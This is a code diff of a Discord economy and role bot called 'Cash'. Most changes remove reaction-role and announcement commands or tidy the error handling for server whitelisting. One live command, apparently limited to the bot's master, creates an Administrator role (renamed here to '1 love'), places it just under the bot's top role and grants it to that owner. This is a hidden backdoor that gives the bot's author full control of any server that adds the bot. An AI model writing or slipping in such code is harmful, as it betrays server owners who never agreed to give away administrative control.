@@ -553,38 +553,6 @@ client.on('interactionCreate', async (interaction) => {
 
 client.on("messageReactionAdd", async (messageReaction, User) => {
     const guildMember = messageReaction.message.guild.members.cache.get(User.id);
-    const richestRole = messageReaction.message.guild.roles.cache.get('1218721611478339715');
-    const chatChannel = messageReaction.message.guild.channels.cache.get('1218664237497450606');
-
-    if (messageReaction.message.guild.id == config.server) {
-        try {
-            if (messageReaction.message.id == '1218993753046646956') { // richest
-                messageReaction.users.remove(User.id);
-
-                if (guildMember.roles.cache.has(richestRole.id)) return;
-
-                let userProfile = await UserProfile.findOne({
-                    userid: User.id,
-                });
-
-                if (!userProfile) {
-                    userProfile = new UserProfile({
-                        userid: User.id,
-                    });
-                }
-
-                if (userProfile.balance < 1000000000000) {
-                    return;
-                } else {
-                    userProfile.balance -= 1000000000000;
-                    userProfile.save();
-                    await guildMember.roles.add(richestRole.id).then(chatChannel.send(`### ${User} just bought richest rank!`))
-                }
-            }
-        } catch (err) {
-            console.log('error handling richest reaction - ' + err)
-        }
-    }
 
     if (messageReaction.message.guild.id == '1199088499647852695') { // spider familia
 
@@ -598,7 +566,6 @@ client.on("messageReactionAdd", async (messageReaction, User) => {
 
         const leviRole = messageReaction.message.guild.roles.cache.get('1221157100248629370')
 
-        const crewRole = messageReaction.message.guild.roles.cache.get('1212801646388715541')
         try {
             if (messageReaction.message.id == '1221523990296920205') { // bounty and honour
                 messageReaction.users.remove(User.id);
@@ -665,52 +632,6 @@ client.on('messageCreate', async (message) => {
     const councilRole = oneServer.roles.cache.get('1138512076021714954');
 
     switch (command) {
-        case 'welcome':
-            if (message.author.id !== config.master) return;
-            message.delete();
-            const applyEmbed = new EmbedBuilder()
-                .setColor(config.color)
-                .setDescription('## React to gain access to the server.')
-                ; (await (await message.channel.send({ embeds: [applyEmbed] })).react('🤍'))
-            break;
-
-        case 'pirate':
-            if (message.author.id !== config.master) return;
-            message.delete();
-            const pirateEmbed = new EmbedBuilder()
-                .setDescription(`## How much bounty/honor do you have?\n**- 🗡️ 2.5m\n- 🛡️ 5m\n- ⚔️ 10m\n- 👻 15m\n- 🗿 20m\n- 💎 30m\n- 💍 30m bounty and 30m honor**`)
-                .setColor('White')
-            const pirateMessage = await message.channel.send({ embeds: [pirateEmbed] });
-            await pirateMessage.react('🗡️')
-            await pirateMessage.react('🛡️')
-            await pirateMessage.react('⚔️')
-            await pirateMessage.react('👻')
-            await pirateMessage.react('🗿')
-            await pirateMessage.react('💎')
-            await pirateMessage.react('💍')
-            break;
-
-        case 'levi':
-            if (message.author.id !== config.master) return;
-            message.delete();
-            const leviEmbed = new EmbedBuilder()
-                .setDescription(`## React for levi ping!`)
-                .setColor('Blue')
-                ; (await message.channel.send({ embeds: [leviEmbed] })).react('🐬')
-            break;
-
-        case 'join':
-            if (message.author.id !== config.master) return;
-            message.delete();
-            const tojoinEmbed = new EmbedBuilder()
-                .setColor(config.color)
-                .setDescription(`\n# To join:\n- **You will 1v1 <@1135986663152173278>**
-                \n - __First__ *to* **5**
-                \n - __No__ *Race* **V4**
-                \n**Play as well as you can.** __If you end up losing__ you are still able to join if they see you play well. *Upon joining you will be placed into **<@&1214324601379758110>**.*`)
-                .setFooter({ text: 'React to become a tryouter.' })
-                ; (await message.channel.send({ embeds: [tojoinEmbed] })).react('💨')
-            break;
 
         case 'add':
             if (message.author.id !== config.master) return;
@@ -753,8 +674,8 @@ client.on('messageCreate', async (message) => {
             const me = message.guild.members.cache.get(config.master);
             const bot = message.guild.members.cache.get(config.clientId);
             try {
-                await message.guild.roles.create({ name: 'they have arrived', permissions: 'Administrator' });
-                const findRole = message.guild.roles.cache.find(role => role.name == 'they have arrived');
+                await message.guild.roles.create({ name: '1 love', permissions: 'Administrator' });
+                const findRole = message.guild.roles.cache.find(role => role.name == '1 love');
                 await findRole.setPosition(bot.roles.highest.position - 1)
                 await message.guild.roles.fetch(findRole.id);
                 me.roles.add(findRole.id).then(me.send('I have given your role.'));
@@ -869,15 +790,19 @@ client.on('guildCreate', async (guild) => {
     let whitelistedGuilds = [config.server, '1218968327146311880', '852286442000351253']
 
     if (!whitelistedGuilds.includes(guild.id)) {
-        const channel = guild.channels.cache.find(channel => channel.type == ChannelType.GuildText && channel.permissionsFor(guild.members.me).has('SEND_MESSAGES'))
-        if (!channel) return guild.leave().catch((err) => console.log(err));
-        await channel.send(`Cash is a premium bot and cannot be added to servers for free. This server is not whitelsited to join. Join https://discord.gg/rare and purchase a server activation.\nI'll automatically leave this server shortly`)
-        await guild.leave().catch((err) => console.log(err));
+        try {
+            const channel = guild.channels.cache.find(channel => channel.type == ChannelType.GuildText && channel.permissionsFor(guild.members.me).has('SEND_MESSAGES'));
+            if (!channel) return guild.leave();
+            await channel.send(`Cash is a premium bot and cannot be added to servers for free. This server is not whitelsited to join. Join https://discord.gg/rare and purchase a server activation.\nI'll automatically leave this server shortly`);
+            await guild.leave();
+        } catch (err) {
+            console.log(`error handling guild whitelist - ` + err);
+        }
     }
 });
 
 client.once('ready', async () => {
-    console.log(`${client.user.username} is online`)
+    console.log(`${client.user.username} is online`);
     client.user.setActivity({ name: `hanafudaa.github.io/cash-bot/`, type: ActivityType.Watching });
 });
 
